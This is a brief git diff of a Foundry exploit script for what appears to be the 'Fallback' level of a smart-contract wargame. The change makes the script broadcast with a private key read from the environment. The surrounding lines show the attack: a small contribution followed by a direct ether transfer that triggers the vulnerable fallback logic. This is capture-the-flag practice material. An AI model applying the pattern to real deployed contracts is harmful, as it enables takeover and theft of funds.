@@ -10,7 +10,7 @@ contract ExploitLevel1 is Script {
     Fallback fbInstance = Fallback(payable(instance));
 
     function run() external {
-        vm.startBroadcast();
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
         fbInstance.contribute{value: 0.0001 ether}();
         (bool success,) = payable(instance).call{value: 0.00001 ether}("");
